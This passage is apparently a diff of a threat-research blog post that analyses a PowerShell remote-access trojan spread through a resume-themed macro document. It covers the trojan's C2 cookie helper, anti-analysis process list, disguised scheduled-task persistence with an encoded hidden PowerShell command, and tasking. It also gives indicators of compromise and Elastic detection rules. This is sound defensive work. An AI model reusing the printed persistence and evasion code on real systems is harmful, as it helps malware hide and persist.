 <p>Stage 5 contains one further piece of code worth calling out here, because at a casual reading it looks like a sixth wrapper but is in fact a network helper. Inside the Invoke-Request function, and again inside the runspace initialiser that backs the implant's parallel uploader, the script defines a Get-Cookie routine that writes a JScript file named aes_&lt;guid&gt;.js into the user's %TEMP% directory and executes it with cscript.exe //nologo. The file is built at request time from two pieces fetched over the network: the slowAES JavaScript library served at /aes.js on the C2 host, and the HTML challenge page served at the C2 root. The implant strips the HTML wrapper and the location.href redirect tail from the page, substitutes WScript.Echo(toHex(slowAES.decrypt(c, 2, a, b))) for the redirect logic so that cscript prints the cookie value to standard output instead of navigating away, concatenates the two pieces into aes_&lt;guid&gt;.js, runs the file through cscript, and captures the resulting 32-character hex string. The string becomes the test cookie that the implant attaches to every subsequent MODE-headered POST, and a finally block removes the temporary file once cscript exits.</p>
 <p>The reason this helper exists is that the C2 is hosted on InfinityFree, the free hosting platform behind the 42web[.]io domain, and InfinityFree fronts every customer site with a JavaScript anti-scraping check that requires the browser to solve a slowAES challenge before any further requests are accepted. Without a valid __test cookie, the C2 would reject the implant's POSTs as bot traffic, so the helper is a precondition for every C2 round trip rather than a stage in its own right. It does not appear in the five-layer unwrap above for the same reason: it does not wrap the next layer, it has no encoded body of its own, and its JavaScript content lives on the C2 rather than inside any of the stages on disk.</p>
-<h4 id="anti-analysis-anti-debugging-and-vm-detection"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#anti-analysis-anti-debugging-and-vm-detection">Anti-Analysis, Anti-Debugging and VM Detection</a></h4>
+<h3 id="anti-analysis-anti-debugging-and-vm-detection">Anti-Analysis, Anti-Debugging and VM Detection<a class="headerlink" href="#anti-analysis-anti-debugging-and-vm-detection" title="Permanent link">&para;</a></h3>
 <p>Before any persistence or network activity, the loader runs <em>Invoke-EnvironmentCheck</em>. The function enumerates 50+ process-name patterns spread across three buckets and aborts if any match.</p>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">$vmProcesses</span> <span class="p">=</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="p">@(</span><span class="s1">&#39;vmwaretray&#39;</span><span class="p">,</span><span class="s1">&#39;vboxservice&#39;</span><span class="p">,</span><span class="s1">&#39;vboxtray&#39;</span><span class="p">,</span><span class="s1">&#39;vmsrvc&#39;</span><span class="p">,</span><span class="s1">&#39;vmusrvc&#39;</span><span class="p">,</span><span class="s1">&#39;vmxnet&#39;</span><span class="p">)</span>
@@ -846,7 +1206,7 @@
 </span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="s1">&#39;processhacker&#39;</span><span class="p">,</span><span class="s1">&#39;sysmon&#39;</span><span class="p">,</span><span class="s1">&#39;pestudio&#39;</span><span class="p">,</span><span class="s1">&#39;dnf&#39;</span><span class="p">,</span><span class="s1">&#39;volatility&#39;</span><span class="p">,</span><span class="s1">&#39;ftkimager&#39;</span><span class="p">,</span>
 </span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="s1">&#39;autopsy&#39;</span><span class="p">,</span><span class="s1">&#39;resourcehacker&#39;</span><span class="p">,</span><span class="s1">&#39;vmmap&#39;</span><span class="p">,</span><span class="s1">&#39;vmmap64&#39;</span><span class="p">,</span><span class="s1">&#39;portmon&#39;</span><span class="p">,</span><span class="s1">&#39;processlasso&#39;</span><span class="p">)</span>
 </span></code></pre></div>
-<h4 id="persistence"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#persistence">Persistence</a></h4>
+<h3 id="persistence">Persistence<a class="headerlink" href="#persistence" title="Permanent link">&para;</a></h3>
 <p>Once the environment check passes, it installs a scheduled task whose action is <em>C:\Windows\System32\conhost.exe</em> with <em>powershell.exe -NoP -exec BYpass -w hIdden -Enc &lt;UTF-16LE base64&gt;</em> as its argument. The trigger is a one-off ten minutes after registration, repeating every four hours.</p>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nv">$action</span> <span class="p">=</span> <span class="nb">New-ScheduledTaskAction</span> <span class="n">-Execute</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="s2">&quot;C:\Windows\System32\conhost.exe&quot;</span> <span class="p">`</span>
@@ -870,7 +1230,7 @@
 </span></code></pre></div>
 <p>Two design choices here are worth calling out. First, the task name is <em>MicrosoftEdgeUpdateTaskMachine-&lt;user SID&gt;</em>. Legitimate Microsoft Edge update tasks use a <em>{GUID}</em> suffix. Second, the loader registers the task <em>twice</em>: once in the user's own context, and then again under SYSTEM at -RunLevel Highest. The second call is wrapped in a <em>try { ... } catch { }</em> swallow, so on an unprivileged victim it silently fails and only the first registration sticks. On an admin or UAC-bypassed session, both succeed and the task runs as SYSTEM thereafter. That is the only privilege-escalation surface in the chain - there is no exploit, just an opportunistic attempt that costs nothing if it fails.</p>
 <p>The third design detail is the choice of <em>conhost.exe</em> as the Execute argument with <em>powershell.exe</em> as its Argument. That trampoline forces <em>conhost.exe</em> to spawn <em>powershell.exe</em> as its child, which complicates simple parent-process detections that key on Office spawning PowerShell directly. The parent of the recurring PowerShell is therefore <em>conhost</em>, not <em>cmd</em> and not <em>winword</em>, and only the initial detonation produces the WINWORD -&gt; cmd -&gt; powershell tree.</p>
-<h4 id="https-rat-capabilities"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#https-rat-capabilities">HTTPS RAT Capabilities</a></h4>
+<h3 id="https-rat-capabilities">HTTPS RAT Capabilities<a class="headerlink" href="#https-rat-capabilities" title="Permanent link">&para;</a></h3>
 <p>The final stage, recovered from <em>default.ps1</em> after the XOR decrypt and the inner base64 unwrap, is a custom PowerShell HTTP RAT roughly 25 KB in size. I have not seen this loader's exact shape published elsewhere, and I refer to it by its own <em>buildInfo</em> value: <em>baesystem</em>.</p>
 <p>The RAT's configuration lives encrypted in the script itself using the same XOR-mixed-key construction as the dropper, with a different key/salt pair and an extra colon-delimited ciphertext field: <em>oUaJx2LlCscrgwR/8xNKWA==:sgdMBamy9tE=:&lt;base64 ciphertext&gt;</em>.</p>
 <p>Decrypting it yields a single JSON object.</p>
@@ -925,9 +1285,9 @@
 </tbody>
 </table>
 <p>The dispatcher <em>Process-TaskCommands</em> switches on a type field returned by the GC poll and supports exactly four task types: <em>cmd</em> (executed via cmd /c $taskCmd), <em>powershell</em> (executed via Invoke-Expression), <em>download</em> (calls Send-LargeFile to exfiltrate a file from victim to operator) and <em>upload</em> (calls Get-LargeFile to push a new file from operator to victim). The task-type names are written from the operator's perspective, which is the inverse of the victim-side MODE names: the download task exfiltrates from victim to operator and is carried by the UF (upload file) mode, while the upload task delivers a file from operator to victim and is carried by the DF (download file) mode.</p>
-<h3 id="detection-and-mitigation"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#detection-and-mitigation">Detection and Mitigation</a></h3>
+<h2 id="detection-and-mitigation">Detection and Mitigation<a class="headerlink" href="#detection-and-mitigation" title="Permanent link">&para;</a></h2>
 <p>I recommend the following layered approach to prevention, detection, and hunting:</p>
-<h4 id="prevention-and-hardening"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#prevention-and-hardening">Prevention and Hardening</a></h4>
+<h3 id="prevention-and-hardening">Prevention and Hardening<a class="headerlink" href="#prevention-and-hardening" title="Permanent link">&para;</a></h3>
 <ul>
 <li>
 <p><strong>Macro Restrictions:</strong> Block macro execution in documents originating from outside the organisation. Verify that Microsoft's Mark-of-the-Web (MotW) macro-blocking GPOs are strictly enforced.</p>
@@ -936,7 +1296,7 @@
 <p><strong>PowerShell Constraints:</strong> Restrict PowerShell to Constrained Language Mode (CLM) for non-administrative users and verify that AMSI providers remain attached and functional.</p>
 </li>
 </ul>
-<h4 id="host-based-detection"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#host-based-detection">Host-Based Detection</a></h4>
+<h3 id="host-based-detection">Host-Based Detection<a class="headerlink" href="#host-based-detection" title="Permanent link">&para;</a></h3>
 <ul>
 <li>
 <p><strong>Malicious Execution Chains:</strong> Alert on a WINWORD.EXE ancestor spawning a cmd.exe → powershell.exe chain where the command line contains -NoP, -exec BYpass, -w hIdden, and a base64 argument exceeding three kilobytes in length.</p>
@@ -951,7 +1311,7 @@
 <p><strong>Masqueraded File Drops:</strong> Alert on the creation of any file under C:\Users\Public\ whose first line matches the regex ^[A-Za-z]+:\s+[A-Za-z0-9+/]{40,}={0,2}$. The Error: &lt;base64&gt; masquerade is distinctive, and benign software does not produce this pattern.</p>
 </li>
 </ul>
-<h4 id="network-based-detection"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#network-based-detection">Network-Based Detection</a></h4>
+<h3 id="network-based-detection">Network-Based Detection<a class="headerlink" href="#network-based-detection" title="Permanent link">&para;</a></h3>
 <ul>
 <li>
 <p><strong>Custom HTTP Headers:</strong> Hunt and alert on outbound HTTPS POST traffic carrying a MODE request header with the values LI, RP, GC, UF, or DF. This is not a standard HTTP convention and should yield a near-zero noise hunt.</p>
@@ -960,11 +1320,11 @@
 <p><strong>C2 Infrastructure:</strong> Block egress traffic to updatepowershellservice[.]42web[.]io. Consider blocking the wider *.42web[.]io namespace if business requirements permit.</p>
 </li>
 </ul>
-<h4 id="threat-hunting"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#threat-hunting">Threat Hunting</a></h4>
+<h3 id="threat-hunting">Threat Hunting<a class="headerlink" href="#threat-hunting" title="Permanent link">&para;</a></h3>
 <ul>
 <li><strong>Mutex Sweeps:</strong> Hunt for the Global\SysInfoProject_* mutex using EDR telemetry (specifically querying for CreateMutex API calls) or by conducting live sweeps across the fleet using tools like handle.exe.</li>
 </ul>
-<h3 id="indicators-of-compromise"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#indicators-of-compromise">Indicators of Compromise</a></h3>
+<h2 id="indicators-of-compromise">Indicators of Compromise<a class="headerlink" href="#indicators-of-compromise" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
@@ -1086,7 +1446,7 @@
 </tr>
 </tbody>
 </table>
-<h3 id="mitre-attck-mapping"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#mitre-attck-mapping">MITRE ATT&amp;CK Mapping</a></h3>
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping<a class="headerlink" href="#mitre-attck-mapping" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
@@ -1219,9 +1579,9 @@
 </tr>
 </tbody>
 </table>
-<h3 id="detection-efforts"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#detection-efforts">Detection Efforts</a></h3>
+<h2 id="detection-efforts">Detection Efforts<a class="headerlink" href="#detection-efforts" title="Permanent link">&para;</a></h2>
 <p>To validate the detection logic recommended above, I detonated EmployeeResumeForm.docm on an instrumented sandbox shipping Elastic Defend into Elastic SIEM (with Sysmon present for the first detonation). This section documents what surfaced in Elastic SIEM, and which rules the telemetry would alert on.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig11.png" src="images/FiveStage-RAT-Resume-Lure-fig11.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig11.png" src="../images/FiveStage-RAT-Resume-Lure-fig11.png" /></p>
 <p><em>Figure 11: Execution Chain Observed in Elastic SIEM</em></p>
 <p>The sample was detonated in two phases. In the first phase the sandbox ran with Sysmon and standard VirtualBox guest tooling present. Under these conditions the malicious document spawned its initial process chain, but the embedded PowerShell terminated early without establishing persistence or contacting external infrastructure. Analysis of the deobfuscated script explained this behaviour. Before taking any action, the loader enumerates running processes and compares them against a hardcoded list of analysis, virtualisation, and forensic tooling, and it exits silently if any match is found. The presence of Sysmon alone was sufficient to trigger this check.</p>
 <p>In the second phase the sandbox was re-provisioned with the Sysmon service and VirtualBox helper processes removed, so the sample would proceed past its environment check. This run produced the complete attack chain, including scheduled task persistence, a second execution stage, and command and control traffic. Elastic Defend retained full process, file, network, and registry visibility throughout both phases because its sensor does not run under any of the process names the sample screens for. The alerts and detection gaps described below are drawn from this second, fully executed run unless stated otherwise.</p>
@@ -1300,7 +1660,7 @@
 </table>
 <p>The most important observation from this set is that detection coverage was broad but shallow, and the severities were inverted relative to the actual risk. The single High severity alert fired on the public IP lookup, which is a comparatively low-impact reconnaissance step.</p>
 <p>The genuinely significant behaviours, namely the scheduled task persistence and the command-and-control activity, surfaced only as Low and Medium alerts. The alerts also arrived as isolated, single-event detections with no correlation between them, so an analyst would have seen a scatter of unrelated low-confidence signals rather than one coherent high-confidence incident. This fragmentation, combined with the inverted severity, is the central weakness this exercise exposed, and it directly motivates the new and tuned detections proposed in the next subsection.</p>
-<h4 id="detection-gaps-and-recommended-rules"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#detection-gaps-and-recommended-rules">Detection Gaps and Recommended Rules</a></h4>
+<h3 id="detection-gaps-and-recommended-rules">Detection Gaps and Recommended Rules<a class="headerlink" href="#detection-gaps-and-recommended-rules" title="Permanent link">&para;</a></h3>
 <p>While the existing rule set produced alerts at most stages of the chain, several of the most security-relevant behaviours generated no alert at all. These gaps matter because they represent the techniques an analyst would most want flagged, and because they are the steps least likely to be benign in a production environment. The following behaviours were observed in the telemetry but did not trigger any detection rule.</p>
 <p><strong>The first gap</strong> is the use of cscript.exe to execute a JScript file from a user-writable temporary directory. On every C2 round trip the implant's Get-Cookie helper wrote a JScript file (aes_&lt;guid&gt;.js) into the user's %TEMP% directory and executed it through the Windows Script Host (cscript.exe //nologo), which breaks the PowerShell process lineage and continues execution under a different interpreter. No rule covered a script interpreter launching a script from a temporary or public path, despite this being a reliable indicator of staged execution.</p>
 <p><strong>The second gap</strong> is the use of conhost.exe as a proxy launcher. The scheduled task action invoked conhost.exe with powershell.exe and an encoded command as its arguments, using the console host as an intermediary to launch the payload. While an unusual parent-child rule did fire on the resulting relationship, no rule specifically identified conhost.exe being supplied another executable as an argument, which is an anomalous and high-confidence signal.</p>
@@ -1310,8 +1670,8 @@
 <p><strong>The sixth gap</strong> is the command-and-control (C2) beacon to free hosting infrastructure. The second stage resolved and connected to a domain on a free web hosting provider, and the repeated connections to the same destination indicated beaconing behaviour. The existing remote file download rule fired on the associated activity, but there was no detection keyed on a script interpreter contacting free or anomalous hosting infrastructure, and no analytic identifying the periodic beacon pattern itself.</p>
 <p>Underlying several of these gaps is a visibility limitation rather than a missing rule. Elastic Defend observed only the outer command lines of the PowerShell stages, so the decrypted script bodies, the environment check logic, and the decryption routine were never available to the detection engine. Enabling PowerShell script block logging and ingesting it into Elastic SIEM is the single highest-value improvement available here, because it would expose the deobfuscated script content that rules five and the reflection-based loader behaviour depend on. This should be treated as a prerequisite for the script-content detections rather than an optional enhancement.</p>
 <p>Taken together, these gaps share a common theme. The existing rules detect well-known atomic techniques such as Office spawning a shell or PowerShell using encoded arguments, but they do not cover the evasion, masquerade, and staging behaviours that distinguish this sample from commodity activity. The recommended rules below are designed to close those gaps, and to favour the behaviours that are both high fidelity and difficult for the actor to alter without changing their tradecraft.</p>
-<h4 id="rule-1-script-interpreter-executing-from-temp-or-public-path"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#rule-1-script-interpreter-executing-from-temp-or-public-path">Rule 1 - Script Interpreter Executing from Temp or Public Path</a></h4>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig12.png" src="images/FiveStage-RAT-Resume-Lure-fig12.png" /></p>
+<h3 id="rule-1-script-interpreter-executing-from-temp-or-public-path">Rule 1 - Script Interpreter Executing from Temp or Public Path<a class="headerlink" href="#rule-1-script-interpreter-executing-from-temp-or-public-path" title="Permanent link">&para;</a></h3>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig12.png" src="../images/FiveStage-RAT-Resume-Lure-fig12.png" /></p>
 <p><em>Figure 12: Elastic SIEM Validation of Rule 1</em></p>
 <div class="language-json highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">{</span>
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Script Interpreter Executing Script from Temporary or Public</span>
@@ -1363,8 +1723,8 @@
 <p>Validation query (Figure 12):</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>event.type : &quot;start&quot; and process.name : (&quot;cscript.exe&quot; or &quot;wscript.exe&quot;) and process.parent.name : (&quot;powershell.exe&quot; or &quot;pwsh.exe&quot; or &quot;conhost.exe&quot;) and process.args : (*Temp* or *Public*)
 </span></code></pre></div>
-<h4 id="rule-2-conhostexe-spawned-with-a-secondary-executable-argument"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#rule-2-conhostexe-spawned-with-a-secondary-executable-argument">Rule 2 - conhost.exe Spawned with a Secondary Executable Argument</a></h4>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig13.png" src="images/FiveStage-RAT-Resume-Lure-fig13.png" /></p>
+<h3 id="rule-2-conhostexe-spawned-with-a-secondary-executable-argument">Rule 2 - conhost.exe Spawned with a Secondary Executable Argument<a class="headerlink" href="#rule-2-conhostexe-spawned-with-a-secondary-executable-argument" title="Permanent link">&para;</a></h3>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig13.png" src="../images/FiveStage-RAT-Resume-Lure-fig13.png" /></p>
 <p><em>Figure 13: Elastic SIEM Validation of Rule 2</em></p>
 <div class="language-json highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">{</span>
 </span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Console Host (conhost.exe) Used as Proxy Launcher&quot;</span><span class="p">,</span>
@@ -1409,9 +1769,9 @@
 <p>Validation query (Figure 13):</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>event.type : &quot;start&quot; and process.name : &quot;conhost.exe&quot; and process.args : *powershell*
 </span></code></pre></div>
-<h4 id="rule-3-scheduled-task-masquerading-as-microsoft-edge-update"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#rule-3-scheduled-task-masquerading-as-microsoft-edge-update">Rule 3 - Scheduled Task Masquerading as Microsoft Edge Update</a></h4>
+<h3 id="rule-3-scheduled-task-masquerading-as-microsoft-edge-update">Rule 3 - Scheduled Task Masquerading as Microsoft Edge Update<a class="headerlink" href="#rule-3-scheduled-task-masquerading-as-microsoft-edge-update" title="Permanent link">&para;</a></h3>
 <p>This covers Gap 3. The generic "scheduled task created" rule fired only at Low and ignored the deception. This one keys on the name-and-action mismatch: a task impersonating the Edge updater whose action is an encoded interpreter rather than the genuine MicrosoftEdgeUpdate.exe. Because Register-ScheduledTask writes through the Schedule service rather than spawning schtasks.exe, the highest-fidelity catch is at task execution time, when the Schedule service spawns conhost/powershell carrying an encoded command.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig14.png" src="images/FiveStage-RAT-Resume-Lure-fig14.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig14.png" src="../images/FiveStage-RAT-Resume-Lure-fig14.png" /></p>
 <p><em>Figure 14: Elastic SIEM Validation of Rule 3</em></p>
 <div class="language-json highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">{</span>
 </span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nt">&quot;rule_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;a1f4c2e7-3b9d-4e21-9c6a-7d2f0b5e8a13&quot;</span><span class="p">,</span>
@@ -1486,9 +1846,9 @@
 <p>Validation query (Figure 14):</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>event.type : &quot;start&quot; and process.parent.name : &quot;svchost.exe&quot; and process.name : &quot;conhost.exe&quot; and process.args : *powershell*
 </span></code></pre></div>
-<h4 id="rule-4-microsoft-office-application-writing-a-script-or-executable"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#rule-4-microsoft-office-application-writing-a-script-or-executable">Rule 4 - Microsoft Office Application Writing a Script or Executable</a></h4>
+<h3 id="rule-4-microsoft-office-application-writing-a-script-or-executable">Rule 4 - Microsoft Office Application Writing a Script or Executable<a class="headerlink" href="#rule-4-microsoft-office-application-writing-a-script-or-executable" title="Permanent link">&para;</a></h3>
 <p>This rule covers Gap 4, the macro dropping default.ps1 into C:\Users\Public\Microsoft. Office applications have no legitimate reason to author script or executable file types, so this is a high-fidelity behavioral rule against the file event stream.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig15.png" src="images/FiveStage-RAT-Resume-Lure-fig15.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig15.png" src="../images/FiveStage-RAT-Resume-Lure-fig15.png" /></p>
 <p><em>Figure 15: Elastic SIEM Validation of Rule 4</em></p>
 <div class="language-json highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">{</span>
 </span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nt">&quot;rule_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot; b7e2d934-8c1a-4f56-a0e3-9f1c4d6b2e88&quot;</span><span class="p">,</span>
@@ -1562,9 +1922,9 @@
 <p>Validation query (Figure 15):</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>event.type : (&quot;creation&quot; or &quot;change&quot;) and process.name : (&quot;WINWORD.EXE&quot; or &quot;EXCEL.EXE&quot; or &quot;POWERPNT.EXE&quot; or &quot;OUTLOOK.EXE&quot;) and file.extension : (&quot;ps1&quot; or &quot;js&quot; or &quot;vbs&quot; or &quot;hta&quot; or &quot;exe&quot; or &quot;dll&quot;)
 </span></code></pre></div>
-<h4 id="rule-5-powershell-enumerating-analysis-and-virtualization-tooling"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#rule-5-powershell-enumerating-analysis-and-virtualization-tooling">Rule 5 - PowerShell Enumerating Analysis and Virtualization Tooling</a></h4>
+<h3 id="rule-5-powershell-enumerating-analysis-and-virtualization-tooling">Rule 5 - PowerShell Enumerating Analysis and Virtualization Tooling<a class="headerlink" href="#rule-5-powershell-enumerating-analysis-and-virtualization-tooling" title="Permanent link">&para;</a></h3>
 <p>This covers Gap 5, the Invoke-EnvironmentCheck routine that enumerated processes against a hardcoded list of VM, debugger, and forensic tools and exited if any matched. This is the behavior that suppressed the first detonation, and it is one of the most distinctive signatures of the sample. It cannot be detected from process command lines alone, because the tool names live inside the decoded script body. It requires PowerShell script block logging (Event ID 4104) to be enabled.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig16.png" src="images/FiveStage-RAT-Resume-Lure-fig16.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig16.png" src="../images/FiveStage-RAT-Resume-Lure-fig16.png" /></p>
 <p><em>Figure 16: Elastic SIEM Validation of Rule 5</em></p>
 <div class="language-json highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">{</span>
 </span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nt">&quot;rule_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;c8d3f1a6-2e74-4b90-8f1c-6a9e0d3b7c25&quot;</span><span class="p">,</span>
@@ -1648,9 +2008,9 @@
 <p>Validation query (Figure 16):</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>event.code : &quot;4104&quot; and powershell.file.script_block_text : (&quot;vboxservice&quot; or &quot;x64dbg&quot; or &quot;wireshark&quot; or &quot;sysmon&quot; or &quot;procmon&quot; or &quot;fiddler&quot; or &quot;volatility&quot; or &quot;pestudio&quot;)
 </span></code></pre></div>
-<h4 id="rule-6-script-interpreter-beaconing-to-free-hosting-infrastructure"><a class="toclink" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#rule-6-script-interpreter-beaconing-to-free-hosting-infrastructure">Rule 6 - Script Interpreter Beaconing to Free Hosting Infrastructure</a></h4>
+<h3 id="rule-6-script-interpreter-beaconing-to-free-hosting-infrastructure">Rule 6 - Script Interpreter Beaconing to Free Hosting Infrastructure<a class="headerlink" href="#rule-6-script-interpreter-beaconing-to-free-hosting-infrastructure" title="Permanent link">&para;</a></h3>
 <p>This covers Gap 6, the Stage 3 beacon to updatepowershellservice.42web.io. It keys on a script interpreter resolving or connecting to domains on free web hosting and dynamic DNS providers, which legitimate enterprise software almost never does from an interpreter process.</p>
-<p><img alt="FiveStage-RAT-Resume-Lure-fig17.png" src="images/FiveStage-RAT-Resume-Lure-fig17.png" /></p>
+<p><img alt="FiveStage-RAT-Resume-Lure-fig17.png" src="../images/FiveStage-RAT-Resume-Lure-fig17.png" /></p>
 <p><em>Figure 17: Elastic SIEM Validation of Rule 6</em></p>
 <div class="language-json highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">{</span>
 </span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nt">&quot;rule_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;d4a9b2e8-5c16-4f73-9b2d-0e8f1c7a6d49&quot;</span><span class="p">,</span>
@@ -1719,312 +2079,29 @@
 <hr />
 <ol>
 <li id="fn:1">
-<p><a href="https://repositum.tuwien.at/handle/20.500.12708/203671">https://repositum.tuwien.at/handle/20.500.12708/203671</a>&#160;<a class="footnote-backref" href="a-five-stage-powershell-http-rat-hidden-behind-an-employee-resume-lure/#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+<p><a href="https://repositum.tuwien.at/handle/20.500.12708/203671">https://repositum.tuwien.at/handle/20.500.12708/203671</a>&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
 </li>
 </ol>
 </div>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-      <nav class="md-post__authors md-typeset">
-        
-          <span class="md-author">
-            <img src="https://github.com/V0lundr.png" alt="V0lundr">
-          </span>
-        
-      </nav>
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-05-11 00:00:00+00:00">2026-05-11</time></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              13 min read
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="arabic-security-training-lure-deploying-a-vba-reverse-shell"><a class="toclink" href="arabic-vba-reverse-shell/">Arabic Security-Training Lure Deploying a VBA Reverse Shell</a></h2>
-<hr />
-<h2 id="introduction"><a class="toclink" href="arabic-vba-reverse-shell/#introduction">Introduction</a></h2>
-<p>In May 2026, I stumbled upon a weaponised Microsoft Word macro-enabled template (<code>.dotm</code>, 33,966 bytes, SHA-256 <code>e6cc542b690066cf6914e88199ce234236f2d929f313af8b0b2f8babe43d4f7d</code>) that surfaced through one of the VirusTotal hunting rule. The template carries an Arabic-language lure themed as a peer-to-peer review request for a "third security training course", stored as an AutoText entry rather than in the visible document body.</p>
-
-    
-      <nav class="md-post__action">
-        <a href="arabic-vba-reverse-shell/">
-          Continue reading
-        </a>
-      </nav>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-      <nav class="md-post__authors md-typeset">
-        
-          <span class="md-author">
-            <img src="https://github.com/V0lundr.png" alt="V0lundr">
-          </span>
-        
-      </nav>
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-05-09 00:00:00+00:00">2026-05-09</time></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              16 min read
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
